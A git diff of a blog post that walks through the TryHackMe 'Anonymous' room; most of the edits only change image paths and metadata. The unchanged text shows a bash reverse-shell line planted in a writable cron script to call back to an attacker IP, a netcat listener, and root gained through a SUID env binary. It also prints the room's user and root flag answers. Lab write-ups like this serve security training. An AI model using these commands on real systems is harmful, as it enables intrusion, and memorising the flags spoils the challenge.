@@ -2,20 +2,26 @@
 title: "Anonymous Rooted: A TryHackMe Walkthrough"
 date: 2025-03-03
 layout: single
-classes: wide
 author_profile: true
-categories: Blog
-tags: [TryHackMe, initial-access, ftp, reverse-shell, linux, privilege-escalation, suid]
 toc: true
+toc_label: "Table of Contents"
+toc_sticky: true
+categories: 
+  - Blog
+  - TryHackMe
+tags: [TryHackMe, initial-access, ftp, reverse-shell, linux, privilege-escalation, suid]
 excerpt: "This walkthrough covers the TryHackMe 'Anonymous' room. I gain user-level access via FTP and a writable script, capture the user flag, and escalate to root via a SUID misconfiguration."
 header:
-  image: /assets/images/tcm-academy/anonymous-01.png
+  image: /assets/images/tcm-academy/anonymous/anonymous-01.png
+  teaser: /assets/images/tcm-academy/anonymous/anonymous-00.png
+  overlay_filter: rgba(0, 0, 0, 0.5)
+  overlay_image: /assets/images/00-hero.jpg
   caption: "TryHackMe Anonymous Room - Rooted"
 seo:
   title: "Anonymous Room Walkthrough | TryHackMe"
   description: "A complete walkthrough of the TryHackMe Anonymous room: initial access via FTP, privilege escalation with a SUID env binary, and root flag capture."
   type: "article"
-  image: /assets/images/tcm-academy/anonymous-01.png
+  image: /assets/images/tcm-academy/anonymous/anonymous-01.png
 ---
 
 ## Introduction
@@ -32,7 +38,7 @@ As always, I started with **network enumeration** to get the lay of the land. I 
 sudo nmap -p- -T4 -A 10.10.64.179
 ```
 
-![Nmap Scan Results](/assets/images/anonymous-02.png)
+![Nmap Scan Results](/assets/images/tcm-security/anonymous/anonymous-02.png)
 
 ### Results Summary
 
@@ -56,7 +62,7 @@ ftp> ls
 
 I downloaded everything I could using binary mode to avoid corrupting file contents:
 
-![FTP File Discovery](/assets/images/anonymous-03.png)
+![FTP File Discovery](/assets/images/tcm-academy/anonymous/anonymous-03.png)
 
 ```bash
 ftp> binary
@@ -71,7 +77,7 @@ I had three files to analyze:
 
 ---
 
-## Reviewing Downloaded Files
+### Reviewing Downloaded Files
 
 Opening `to_do.txt` gave a hint that FTP access was likely unintentional:
 
@@ -85,7 +91,7 @@ The `removed_files.log` showed a repeated message:
 Running cleanup script: nothing to delete
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-04.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-04.png">
 
 The third file, `clean.sh`, was the most interesting — a bash script designed to remove temp files. Critically, it had **world-writable permissions** and appeared to be executed on a schedule.
 
@@ -93,7 +99,7 @@ The third file, `clean.sh`, was the most interesting — a bash script designed 
 cat clean.sh
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-05.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-05.png">
 
 ---
 
@@ -106,7 +112,7 @@ Since `clean.sh` was writable and likely auto-executed, I weaponized it by inser
 bash -i >& /dev/tcp/10.13.79.36/7777 0>&1
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-06.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-06.png">
 
 I started a Netcat listener and re-uploaded my modified script:
 
@@ -115,8 +121,8 @@ nc -nlvp 7777
 ftp> put clean.sh
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-07.png">  
-<img src="/assets/images/tcm-academy/anonymous-08.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-07.png">  
+<img src="/assets/images/tcm-academy/anonymous/anonymous-08.png">
 
 Seconds later, I caught a shell back.
 
@@ -125,7 +131,7 @@ whoami
 namelessone
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-09.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-09.png">
 
 > ✅ I now had an interactive shell on the target as user `namelessone`.
 
@@ -160,7 +166,7 @@ cd pics
 ls
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-10.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-10.png">
 
 It contained only two `.jpg` files. No hidden credentials or encoded data here — just a decoy or clutter.
 
@@ -180,7 +186,7 @@ Got hit with a TTY-related error:
 sudo: no tty present and no askpass program specified
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-11.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-11.png">
 
 I upgraded to a full TTY using Python:
 
@@ -188,7 +194,7 @@ I upgraded to a full TTY using Python:
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-After that, it prompted for a password — which I didn’t have. I moved on.
+After that, I attempted to execute a sudo -l command again, but it prompted for a password — which I didn’t have. I moved on.
 
 ---
 
@@ -200,14 +206,14 @@ Time to escalate. I searched the system for files with the SUID bit set:
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-12.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-14.png">
 
 Most binaries were standard… except one stood out:
 
 ```bash
 /usr/bin/env
 ```
-
+<img src="/assets/images/tcm-academy/anonymous/anonymous-15.png">
 ---
 
 ## Using `/usr/bin/env` to Gain Root
@@ -218,7 +224,7 @@ According to [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid), if `env`
 /usr/bin/env /bin/bash -p
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-14.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-12.png">
 
 I gave it a shot:
 
@@ -226,7 +232,7 @@ I gave it a shot:
 /usr/bin/env /bin/bash -p
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-15.png">
+
 
 Then confirmed I had root with:
 
@@ -237,7 +243,7 @@ ls /root
 cat /root/root.txt
 ```
 
-<img src="/assets/images/tcm-academy/anonymous-13.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-13.png">
 
 🎉 **Root flag**: `4d930091c31a622a7ed10f27999af363`
 
@@ -254,7 +260,7 @@ cat /root/root.txt
 | What is the content of the `user.txt` flag?                             | `90d6f99258581ff991e68748c414740`          |
 | What is the content of the `root.txt` flag?                             | `4d930091c31a622a7ed10f27999af363`         |
 
-<img src="/assets/images/tcm-academy/anonymous-16.png">
+<img src="/assets/images/tcm-academy/anonymous/anonymous-16.png">
 
 ---
 
